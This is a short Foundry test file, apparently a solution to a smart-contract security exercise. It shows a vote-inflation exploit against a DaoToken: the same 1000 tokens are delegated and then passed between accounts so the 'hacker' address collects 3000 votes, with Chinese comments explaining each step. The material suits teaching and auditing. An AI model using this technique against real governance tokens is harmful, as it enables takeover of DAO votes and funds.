// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DaoToken} from "src/DaoToken.sol";

contract exploitTest is Test {
    DaoToken daoToken;
    address public owner = address(0);
    address public hacker = address(1337);

    address public alice = address(1);
    address public bob = address(2);
    address public carol = address(3);

    function setUp() public {
        vm.startPrank(owner);
        daoToken = new DaoToken();
        daoToken.mint(alice, 1000);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(alice);

        // write your solution here
        // hacker以 alice 的private-key操作，將自己設為代表，此時獲得 1000 votes
        daoToken.delegate(hacker);
        daoToken.transfer(carol, 1000);

        //hacker以 carol 的private-key操作，將自己設為代表，此時獲得 2000 votes
        vm.startPrank(carol);
        daoToken.delegate(hacker);
        daoToken.transfer(bob, 1000);

        //hacker以 bob 的private-key操作，將自己設為代表，此時獲得 3000 votes
        vm.startPrank(bob);
        daoToken.delegate(hacker);
        daoToken.transfer(hacker, 1000);

        vm.stopPrank();

        uint256 hacker_vote = daoToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

        uint256 hacker_balance = daoToken.balanceOf(hacker);
        console.log("Hacker's daoToken after the attack: %s: ", hacker_balance);

        assertEq(hacker_vote, 3000);
        assertEq(hacker_balance, 1000);
    }
}
